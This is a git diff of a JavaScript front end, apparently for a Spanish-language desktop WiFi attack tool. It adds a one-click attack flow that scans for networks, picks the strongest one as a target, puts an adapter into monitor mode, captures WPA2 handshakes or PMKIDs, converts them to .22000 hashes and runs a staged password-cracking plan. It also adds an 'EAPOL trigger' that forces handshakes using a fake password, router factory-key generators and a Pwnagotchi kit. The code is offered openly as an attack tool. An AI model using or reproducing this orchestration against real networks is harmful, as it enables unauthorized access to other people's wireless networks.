@@ -1896,7 +1896,447 @@ window.startAutoAttack = async function () {
 };
 
 
-// ── Estrategia de crack ───────────────────────────────────────────────────
+// Helper: espera a que termine un ataque bg (attack-completed/attack-error) por id.
+function waitForAttack(id, timeoutMs) {
+  return new Promise((resolve) => {
+    let done = false;
+    let un1 = null, un2 = null, timer = null;
+    const finish = (payload) => {
+      if (done) return; done = true;
+      try { if (un1) un1(); } catch {}
+      try { if (un2) un2(); } catch {}
+      if (timer) clearTimeout(timer);
+      resolve(payload);
+    };
+    listen('attack-completed', (e) => {
+      const p = e.payload || e || {};
+      if (p.id === id) finish({ ok: true, p });
+    }).then(u => { un1 = u; if (done) try { u(); } catch {} });
+    listen('attack-error', (e) => {
+      const p = e.payload || e || {};
+      if (p.id === id) finish({ ok: false, p });
+    }).then(u => { un2 = u; if (done) try { u(); } catch {} });
+    if (timeoutMs) timer = setTimeout(() => finish({ ok: false, timeout: true }), timeoutMs);
+  });
+}
+
+// ── Ataque simple (UI: logs + Atacar/Detener) ───────────────────────────
+window.simpleAttack = async function () {
+  if (attackIsBusy()) { log('Ya hay un ataque en curso. Pulsa Detener si quieres cancelarlo.', 'warn'); return; }
+  window._simpleStop = false;
+  window._autoStop = false;
+  if (!claimAttack('simple_attack')) return;
+  window._simpleOrchestrating = true;
+  setAttackRunning(true, 'Preparando ataque…');
+  showProgress(true);
+  updateProgress(2, 'Iniciando…');
+  _liveBuf = '';
+  const lcv = $('live-cv'); if (lcv) lcv.textContent = '─ Logs en tiempo real (stdout/stderr) ─';
+  const stageEl = $('simple-stage');
+  const setStage = (t, pct) => {
+    if (stageEl) stageEl.textContent = t || '';
+    if (pct != null) updateProgress(pct, t || '');
+    if (t) log(`[etapa] ${t}`, 'info');
+  };
+
+  let cracked = false;
+  let hashFile = null;
+  let natGuid = null;
+  let natPcap = null;
+
+  try {
+    // Material provisto (flujo Pwnagotchi/externo): .22000 o .pcap/.pcapng
+    let providedHash = '';
+    let providedPcap = '';
+    const pickMat = (v) => {
+      if (!v) return;
+      const s = String(v).trim();
+      if (/\.22000$/i.test(s)) { if (!providedHash) providedHash = s; }
+      else if (/\.pcapng?$/i.test(s)) { if (!providedPcap) providedPcap = s; }
+    };
+    pickMat(valOrEmpty($('ultra-hash')?.value));
+    pickMat(valOrEmpty($('crack-hash')?.value));
+    pickMat(valOrEmpty($('crackx-hash')?.value));
+    pickMat(valOrEmpty($('convert-native-pcap')?.value));
+    const externalGenerator = valOrEmpty($('ultra-external')?.value) || null;
+    const hasMaterial = !!(providedHash || providedPcap);
+
+    // 0) Objetivo (best effort)
+    let bssid = ($('attack-bssid')?.value || '').trim() || valOrEmpty($('ultra-bssid')?.value) || '';
+    if (!bssid && !hasMaterial) {
+      setStage('Escaneando redes…', 5);
+      try { await window.doScan(); } catch (e) { log('Scan falló: ' + e, 'error'); }
+      bssid = autoSelectStrongest() || (($('attack-bssid')?.value || '').trim());
+    }
+    if (!bssid && !hasMaterial) {
+      log('Sin objetivo y sin material (.22000/.pcap). Selecciona una red en Escanear o indica un hash/captura (p.ej. traída de Pwnagotchi) y pulsa Atacar.', 'error');
+      return;
+    }
+    if (window._simpleStop) throw new Error('cancelado');
+
+    let ssid = '';
+    let ch = undefined;
+    if (bssid) {
+      const n = lastNets.find(x => (x.bssid || '').toUpperCase() === bssid.toUpperCase()) || {};
+      ssid = valOrEmpty($('ultra-ssid')?.value) || (n.ssid && !/oculta/i.test(n.ssid) ? n.ssid : '') || (window._profile && window._profile.ssid) || '';
+      ch = parseInt(n.channel) || selectedChannel() || undefined;
+      log(`Objetivo: ${ssid || '(oculta/desconocido)'} · ${bssid} · CH ${ch || '?'} · ${n.security || ''}`, 'ok');
+      syncTargetEverywhere(bssid, ssid, ch);
+    } else {
+      ssid = valOrEmpty($('ultra-ssid')?.value) || '';
+      bssid = valOrEmpty($('ultra-bssid')?.value) || '';
+      log(`[material] Sin red seleccionada. Usando SSID='${ssid || ''}' BSSID='${bssid || ''}' para el plan (hints/keygen si aplican).`, 'info');
+    }
+    renderTargetBar();
+
+    // 1) Perfil (informativo, solo si hay BSSID conocido)
+    if (bssid) {
+      setStage('Perfilando objetivo…', 10);
+      try {
+        const prof = await window.__invoke('profile_target', { bssid });
+        if (prof) log(`[perfil] ${prof.ssid || ssid}: ${prof.title} — ${prof.detail || ''}`, 'info');
+      } catch (e) { log('[perfil] ' + e, 'warn'); }
+    }
+    if (window._simpleStop) throw new Error('cancelado');
+
+    // 2) Keygen detect (informativo; verificación real en el plan si hay hash)
+    if (ssid) {
+      try {
+        const det = await window.__invoke('keygen_detect', { ssid });
+        if (det && det.success) log(`[keygen] ${det.output}`, 'ok');
+        else log(`[keygen] ${det && (det.output || det.stderr) || 'sin algoritmo de claves de fábrica conocido'}`, 'info');
+      } catch (e) { log('[keygen detect] ' + e, 'warn'); }
+    }
+
+    // Material existente: omite captura (y conversión si ya es .22000)
+    if (providedHash) {
+      hashFile = providedHash;
+      log(`[material] Usando hash .22000 existente: ${hashFile} (se omite captura/conversión).`, 'ok');
+      const uhf = $('ultra-hash'); if (uhf) uhf.value = hashFile;
+    } else if (providedPcap) {
+      natPcap = providedPcap;
+      log(`[material] Usando captura existente: ${natPcap} (se omite captura; se convertirá a .22000).`, 'ok');
+    } else {
+      // 3) Adaptador + monitor + captura nativa (Npcap)
+      setStage('Buscando adaptador con modo monitor…', 18);
+      try {
+        const rep = await window.__invoke('detect_adapters');
+        const adapters = (rep && rep.adapters) || [];
+        const ad = adapters.find(a => (a.monitor_capable || a.monitor_active) && a.guid && a.guid.trim());
+        if (ad) {
+          natGuid = ad.guid.trim();
+          setStage(`Activando modo monitor (${ad.chipset || ad.name || 'adaptador'})…`, 22);
+          try {
+            const m = await window.__invoke('activate_monitor', { ifaceGuid: natGuid, channel: ch || null });
+            log(`[monitor] ${m && (m.message || JSON.stringify(m))}`, m && m.success ? 'ok' : 'warn');
+            if (!(m && m.success) && !ad.monitor_active) {
+              log('[monitor] No se confirmó monitor; se intentará captura si el adaptador ya estaba listo.', 'warn');
+            }
+          } catch (e) {
+            log('[monitor] ' + e, 'warn');
+          }
+        } else {
+          log('Sin adaptador con modo monitor/Npcap compatible. No se puede capturar de forma pasiva nativa.', 'warn');
+          log('Sugerencia: conecta un adaptador compatible, usa la UI avanzada (USB crudo/Kali), o proporciona un .22000/.pcap (p.ej. de Pwnagotchi).', 'info');
+        }
+      } catch (e) { log('[adaptadores] ' + e, 'warn'); }
+      if (window._simpleStop) throw new Error('cancelado');
+
+      if (natGuid) {
+        const dur = 60;
+        setStage(`Capturando ${dur}s (CH ${ch || 'auto'}, pasivo)…`, 30);
+        log(`[captura] native_capture ${dur}s · GUID ${natGuid} · CH ${ch || '?'} (requiere modo monitor; sin inyección en Npcap).`, 'info');
+        try {
+          const cap = await window.__invoke('native_capture', { ifaceGuid: natGuid, durationSecs: dur });
+          log(`[captura] ${cap.message} (packets=${cap.packets}, dlt=${cap.datalink} ${cap.datalink_name || ''})`, cap.success ? 'ok' : 'error');
+          if (cap.success && cap.output_file) {
+            natPcap = cap.output_file;
+            const conv = $('convert-native-pcap'); if (conv) conv.value = natPcap;
+          }
+          if (!cap.success || !cap.packets) {
+            log('Sin paquetes útiles: comprueba monitor activo, canal del AP y tráfico de clientes. Sin inyección no se puede forzar handshake.', 'warn');
+          }
+        } catch (e) { log('[captura] ' + e, 'error'); }
+      }
+      if (window._simpleStop) throw new Error('cancelado');
+    }
+
+    // 4) Convertir a .22000
+    if (!hashFile && natPcap) {
+      setStage('Convirtiendo captura a .22000…', 55);
+      try {
+        const conv = await window.__invoke('pcap_to_22000', { pcapPath: natPcap });
+        (conv.messages || []).forEach(m => log('[convert] ' + m, 'info'));
+        if (conv.success && conv.hash_count > 0) {
+          hashFile = conv.output_file;
+          log(`[convert] OK: ${conv.hash_count} hash(es) (PMKID=${conv.pmkid_count} handshake=${conv.handshake_count}) → ${hashFile}`, 'ok');
+          const uh = $('ultra-hash'); if (uh) uh.value = hashFile;
+          const cx = $('crack-hash'); if (cx) cx.value = hashFile;
+          const ih = $('insp-hash'); if (ih) ih.value = hashFile;
+        } else {
+          log('Sin PMKID/EAPOL en la captura. Sin tráfico de clientes en el canal correcto no hay hash crackeable.', 'warn');
+        }
+      } catch (e) { log('[convert] ' + e, 'error'); }
+    }
+    if (window._simpleStop) throw new Error('cancelado');
+
+    // 5) Crack (plan dirigido real, bg, cancelable)
+    if (hashFile) {
+      try {
+        const s = await window.__invoke('inspect_hash', { hashPath: hashFile });
+        log(`[inspect] total=${s.total} PMKID=${s.pmkid} challenge=${s.challenge} authorized=${s.authorized} ESSID=${(s.essids||[]).join(',')||'?'}`, 'info');
+      } catch (e) { log('[inspect] ' + e, 'warn'); }
+
+      setStage('Probando contraseñas (plan dirigido)…', 65);
+      log('[crack] Plan: keygen (si aplica) → máscaras → diccionarios/reglas → PCFG (-a 4, hashcat v8+ si disponible) → candidatas detectadas (p.ej. exports PassGAN/PassGPT en tools/) → externo opcional. Se detiene en .cracked real.', 'info');
+      currentAttackId = 'crack_plan';
+      try {
+        const r = await window.__invoke('crack_plan_run_bg', { hashFile, ssid: ssid || '', bssid: bssid || '', externalGenerator });
+        log(`[crack] Plan en ejecución (${r.stages} etapas).`, 'info');
+        const done = await waitForAttack('crack_plan');
+        if (done && done.p) {
+          cracked = !!done.p.success;
+          const summary = done.p.stdout || '';
+          if (summary) log(`[crack] resultado:\n${summary}`, cracked ? 'ok' : 'warn');
+          if (cracked) {
+            const m = summary.match(/CRACKED:\s*(.+)/);
+            if (m) log(`✅ CONTRASEÑA ENCONTRADA: ${m[1].trim()}`, 'ok');
+          } else if (!window._simpleStop) {
+            log('Sin coincidencia con las etapas disponibles. Puedes añadir rockyou.txt/reglas, un .txt de candidatas (p.ej. PassGAN/PassGPT) en tools/ o hashcat v8+ (PCFG).', 'warn');
+          }
+        } else if (window._simpleStop) {
+          log('[crack] Plan detenido.', 'warn');
+        } else {
+          log('[crack] Plan terminó sin resultado claro.', 'warn');
+        }
+      } catch (e) { log('[crack] ' + e, 'error'); }
+      if (currentAttackId === 'crack_plan') currentAttackId = null;
+    } else {
+      log('Sin hash crackeable: no se ejecuta el crack. Requisitos: captura con PMKID/handshake en el canal del AP (o proporciona un .22000/.pcap, p.ej. de Pwnagotchi).', 'warn');
+      if (ssid) {
+        try {
+          const det = await window.__invoke('keygen_detect', { ssid });
+          if (det && det.success) {
+            setStage('Generando candidatos de fábrica (sin hash)…', 75);
+            let kg = null;
+            if (/thomson/i.test(det.output || '')) {
+              kg = await window.__invoke('thomson_run', { ssid, bssid, maxKeys: 5 });
+            } else if (/comtrend/i.test(det.output || '')) {
+              kg = await window.__invoke('keygen_run', { ssid, bssid });
+            }
+            if (kg) log(kg.output || kg.stderr, kg.success ? 'ok' : 'warn');
+            log('Candidatos de fábrica generados (sin verificación offline: no hay .22000). Si consigues un hash, el plan los probará.', 'info');
+          }
+        } catch (e) { log('[keygen] ' + e, 'warn'); }
+      }
+    }
+  } catch (e) {
+    if (String(e).includes('cancelado') || window._simpleStop) log('Ataque detenido por el usuario.', 'warn');
+    else log('Error en ataque: ' + e, 'error');
+  } finally {
+    const stopped = !!window._simpleStop;
+    if ($('simple-stage')) $('simple-stage').textContent = cracked ? 'Clave encontrada' : (stopped ? 'Detenido' : 'Terminado');
+    window._simpleOrchestrating = false;
+    if (currentAttackId === 'simple_attack' || currentAttackId === 'crack_plan') currentAttackId = null;
+    setAttackRunning(false);
+    showProgress(false);
+    updateProgress(cracked ? 100 : 0, cracked ? 'Clave encontrada' : (stopped ? 'Detenido' : 'Fin'));
+    log(cracked ? '✅ Ataque finalizado: clave encontrada (ver logs/.cracked).' : (stopped ? '⏹ Ataque detenido.' : 'Ataque finalizado. Revisa los logs: captura/hash/candidatas determinan el resultado.'), cracked ? 'ok' : 'warn');
+  }
+};
+
+window.simplePwnagotchiKit = async function () {
+  const bssid = (getSelectedBssid && getSelectedBssid()) || valOrEmpty(($('attack-bssid') || {}).value) || valOrEmpty($('ultra-bssid')?.value) || '';
+  const n = lastNets.find(x => (x.bssid || '').toUpperCase() === bssid.toUpperCase()) || {};
+  const ssid = valOrEmpty($('ultra-ssid')?.value) || (n.ssid && !/oculta/i.test(n.ssid) ? n.ssid : '') || (window._profile && window._profile.ssid) || '';
+  const ch = parseInt(n.channel) || selectedChannel() || null;
+  try {
+    const r = await window.__invoke('gen_pwnagotchi_kit', { ssid: ssid || null, bssid: bssid || null, channel: ch });
+    const text = (r && (r.output || r.stdout)) || String(r || '');
+    log('[Pwnagotchi kit]\n' + text, 'info');
+    const out = $('ultra-plan-out'); if (out) out.textContent = text;
+  } catch (e) {
+    log('[Pwnagotchi kit] ERROR: ' + e, 'error');
+  }
+};
+
+window.simpleStop = async function () {
+  window._simpleStop = true;
+  window._autoStop = true;
+  log('Detener solicitado por el usuario.', 'warn');
+  if ($('simple-stage')) $('simple-stage').textContent = 'Deteniendo…';
+  try { await window.__invoke('crack_plan_cancel'); } catch {}
+  try { await window.cancelCurrentAttack(); } catch {}
+  // native_capture es síncrona (~60s) y no cancelable; el cierre se normaliza al terminar el paso.
+};
+
+// ── Gatillo EAPOL (dos antenas, Windows sin inyección) ────────────────────
+window.triggerEapol = async function () {
+  const iface = (valOrEmpty($('trigger-iface')?.value) || '').trim();
+  const attempts = parseInt($('trigger-attempts')?.value) || 5;
+  const delay = parseInt($('trigger-delay')?.value) || 3;
+  const password = valOrEmpty($('trigger-password')?.value) || 'clavefalsa123';
+  const bssid = (getSelectedBssid && getSelectedBssid()) || valOrEmpty(($('attack-bssid') || {}).value) || '';
+  const n = lastNets.find(x => (x.bssid || '').toUpperCase() === bssid.toUpperCase()) || {};
+  const ssid = valOrEmpty($('ultra-ssid')?.value) || (n.ssid && !/oculta/i.test(n.ssid) ? n.ssid : '') || (window._profile && window._profile.ssid) || '';
+
+  if (!ssid) {
+    log('[trigger] Falta SSID del objetivo. Selecciona una red en Escanear o pon el SSID en la tarjeta avanzada.', 'warn');
+    return;
+  }
+  if (!iface) {
+    log('[trigger] Falta la interfaz gatillo (managed, visible para netsh, p.ej. "Wi-Fi 2"). Verifica con: netsh wlan show interfaces', 'warn');
+    if ($('trigger-stage')) $('trigger-stage').textContent = 'Falta interfaz gatillo';
+    return;
+  }
+
+  if ($('trigger-stage')) $('trigger-stage').textContent = 'Ejecutando…';
+  log(`[trigger] Iniciando gatillo: SSID='${ssid}' iface='${iface}' intentos=${attempts} espera=${delay}s (solo lab).`, 'info');
+  log('[trigger] IMPORTANTE: la antena de CAPTURA (monitor, canal del AP) debe estar capturando antes de lanzar el gatillo.', 'warn');
+
+  try {
+    const r = await window.__invoke('wpa2_trigger_bg', {
+      ssid, interface: iface, attempts, delaySeconds: delay, password
+    });
+    log(`[trigger] Lanzado (${r.attempts} intentos, ${r.delay_seconds}s entre intentos).`, 'info');
+  } catch (e) {
+    log('[trigger] ERROR al iniciar: ' + e, 'error');
+    if ($('trigger-stage')) $('trigger-stage').textContent = 'Error';
+    return;
+  }
+
+  // Esperar finalización por evento
+  const done = await waitForAttack('wpa2_trigger');
+  if (done && done.p) {
+    const summary = done.p.stdout || '';
+    if (summary) log(`[trigger] resultado:\n${summary}`, done.p.success ? 'ok' : 'warn');
+    if ($('trigger-stage')) $('trigger-stage').textContent = done.p.success ? 'Completado' : 'Terminado';
+  } else {
+    log('[trigger] Gatillo terminó sin resultado claro.', 'warn');
+    if ($('trigger-stage')) $('trigger-stage').textContent = 'Terminado';
+  }
+};
+
+window.triggerCancel = async function () {
+  log('Cancelación del gatillo solicitada.', 'warn');
+  try { await window.__invoke('wpa2_trigger_cancel'); } catch {}
+  if ($('trigger-stage')) $('trigger-stage').textContent = 'Cancelando…';
+};
+
+// Auto-rellenar interfaz gatillo si hay adaptador managed detectado
+function fillTriggerIface() {
+  const el = $('trigger-iface');
+  if (!el || el.value.trim()) return;
+  // no auto-detect robusto sin backend; dejar placeholder
+}
+
+
+// Cierre específico del plan: resumen en tarjeta avanzada (si visible)
+listen('attack-completed', (event) => {
+  try {
+    const d = event.payload || event || {};
+    if (d.id === 'crack_plan') {
+      const out = $('ultra-plan-out');
+      if (out) out.textContent = d.stdout || (d.success ? 'CRACKED' : 'Sin resultado');
+      if (d.success) log('[plan] ¡Clave encontrada! (ver .cracked)', 'ok');
+      else log('[plan] Plan terminado sin clave.', 'warn');
+    }
+  } catch {}
+});
+
+// ── E0-16: Plan de candidatas (ultra simple) ───────────────────────────
+function ultraFillFromTarget() {
+  const bssid = (getSelectedBssid && getSelectedBssid()) || valOrEmpty(($('attack-bssid') || {}).value) || '';
+  const opt = $('attack-bssid')?.options[$('attack-bssid')?.selectedIndex]?.text || '';
+  const ssid = (window._profile && window._profile.ssid) || opt.split('·')[0]?.trim() || '';
+  if (bssid && !$('ultra-bssid').value) $('ultra-bssid').value = bssid;
+  if (ssid && !$('ultra-ssid').value) $('ultra-ssid').value = ssid;
+  // Hereda el hash generado por el paso C / conversión si existe
+  const conv = valOrEmpty(($('convert-native-pcap') || {}).value);
+  if (conv && !$('ultra-hash').value) {
+    const base = conv.replace(/\.pcapng?$/i, '');
+    if (base && base !== conv) $('ultra-hash').value = base + '.22000';
+  }
+  const chash = valOrEmpty(($('crackx-hash') || {}).value) || valOrEmpty(($('crack-hash') || {}).value);
+  if (chash && !$('ultra-hash').value) $('ultra-hash').value = chash;
+}
+
+window.ultraPlanPreview = async function () {
+  ultraFillFromTarget();
+  const hashFile = valOrEmpty($('ultra-hash').value);
+  const ssid = valOrEmpty($('ultra-ssid').value) || '';
+  const bssid = valOrEmpty($('ultra-bssid').value) || '';
+  const externalGenerator = valOrEmpty($('ultra-external')?.value) || null;
+  const out = $('ultra-plan-out');
+  if (!hashFile) { log('Plan: indica el archivo .22000.', 'warn'); if (out) out.textContent = 'Falta el archivo .22000.'; return; }
+  try {
+    const plan = await window.__invoke('crack_plan_preview', { hashFile, ssid, bssid, externalGenerator });
+    const lines = [];
+    lines.push(`Hash: ${plan.hash_file}`);
+    lines.push(`SSID: ${plan.ssid || '(vacío)'}  BSSID: ${plan.bssid || '(vacío)'}`);
+    if (plan.cracked_already) lines.push('⚠️ Ya existe .cracked para este hash (ya está resuelto).');
+    lines.push('Etapas (en orden):');
+    (plan.stages || []).forEach((s, i) => {
+      const ks = (s.keyspace != null) ? ` ~${s.keyspace.toLocaleString()} candidatas` : '';
+      const st = s.enabled ? 'LISTA' : 'OMITIDA';
+      const why = s.skip_reason ? ` — ${s.skip_reason}` : ` — ${s.why}`;
+      lines.push(`${i + 1}. [${st}] ${s.label}${ks}${why}`);
+    });
+    if (out) out.textContent = lines.join('\n');
+    flowResult(lines.join('\n'));
+    log(`[plan] ${ (plan.stages||[]).length } etapa(s) preparadas.`, 'info');
+  } catch (e) {
+    log(`[plan] ERROR: ${e}`, 'error');
+    if (out) out.textContent = 'Error: ' + e;
+  }
+};
+
+window.ultraPlanRun = async function () {
+  ultraFillFromTarget();
+  const hashFile = valOrEmpty($('ultra-hash').value);
+  const ssid = valOrEmpty($('ultra-ssid').value) || '';
+  const bssid = valOrEmpty($('ultra-bssid').value) || '';
+  const externalGenerator = valOrEmpty($('ultra-external')?.value) || null;
+  const out = $('ultra-plan-out');
+  if (!hashFile) { log('Plan: indica el archivo .22000.', 'warn'); if (out) out.textContent = 'Falta el archivo .22000.'; return false; }
+  if (!claimAttack('crack_plan')) return false;
+  showProgress(true);
+  setAttackRunning(true, 'Probando contraseñas (plan dirigido)…');
+  if (out) out.textContent = 'Ejecutando plan dirigido… (mira el log en tiempo real)';
+  try {
+    const r = await window.__invoke('crack_plan_run_bg', { hashFile, ssid, bssid, externalGenerator });
+    log(`[plan] Lanzado (${r.stages} etapas).`, 'info');
+    // La UI se desbloquea en attack-completed (listener global); aquí solo confirmamos arranque.
+    return true;
+  } catch (e) {
+    log(`[plan] ERROR al iniciar: ${e}`, 'error');
+    if (out) out.textContent = 'Error: ' + e;
+    if (currentAttackId === 'crack_plan') currentAttackId = null;
+    setAttackRunning(false);
+    showProgress(false);
+    return false;
+  }
+};
+
+window.ultraPlanCancel = async function () {
+  try { await window.__invoke('crack_plan_cancel'); } catch {}
+  return window.cancelCurrentAttack();
+};
+
+// Cierre específico del plan: mostrar resumen en la tarjeta ultra simple
+listen('attack-completed', (event) => {
+  try {
+    const d = event.payload || event || {};
+    if (d.id === 'crack_plan') {
+      const out = $('ultra-plan-out');
+      if (out) out.textContent = d.stdout || (d.success ? 'CRACKED' : 'Sin resultado');
+      if (d.success) log('[plan] ¡Clave encontrada! (ver .cracked)', 'ok');
+      else log('[plan] Plan terminado sin clave.', 'warn');
+    }
+  } catch {}
+});
+
+
 window.loadCrackAssets = async function () {
   try {
     const a = await window.__invoke('list_crack_assets');
@@ -2332,7 +2772,9 @@ listen('attack-progress', (event) => {
   const { id, type, data } = event.payload;
   if (type !== 'stdout' && type !== 'stderr') return;
   const isSync = id === 'sync' && !currentAttackId;
-  if (id !== currentAttackId && !isSync) return;
+  const orchAllow = window._simpleOrchestrating && (id === 'crack_plan' || id === 'simple_attack');
+  const triggerAllow = id === 'wpa2_trigger';
+  if (id !== currentAttackId && !isSync && !orchAllow && !triggerAllow) return;
   if (isSync) {
     // Solo la primera vez: showProgress(true) reinicia el panel de salida viva.
     const pc = $('progress-container');
@@ -2355,6 +2797,12 @@ listen('attack-started', (event) => {
   const { id, cmdline } = event.payload;
   // Los ataques bg emiten attack-started: activa el lock (por si el flujo no
   // pasó por invokeAttack) y muestra la línea de comando exacta.
+  if (window._simpleOrchestrating && id === 'crack_plan') {
+    // Durante orquestación simple permitimos el sub-paso bg para progreso.
+    setAttackRunning(true, cmdline || 'Plan de contraseñas en curso…');
+    if (cmdline) log(`$ ${cmdline}`, 'info');
+    return;
+  }
   if (id && currentAttackId && id !== currentAttackId) return;
   currentAttackId = id || currentAttackId;
   setAttackRunning(true, cmdline || 'Ataque en curso…');
@@ -2362,7 +2810,17 @@ listen('attack-started', (event) => {
 });
 
 listen('attack-completed', (event) => {
-  const { id } = event.payload;
+  const { id } = event.payload || event || {};
+  if (window._simpleOrchestrating && id === 'crack_plan') {
+    // El orquestador simple espera este evento y gestiona el cierre.
+    if (currentAttackId === 'crack_plan') currentAttackId = null;
+    return;
+  }
+  if (id === 'wpa2_trigger') {
+    // El gatillo es independiente del orquestador de ataque; solo actualiza UI.
+    if ($('trigger-stage')) $('trigger-stage').textContent = 'Terminado';
+    return;
+  }
   if (id === currentAttackId) {
     showProgress(false);
     setAttackRunning(false);
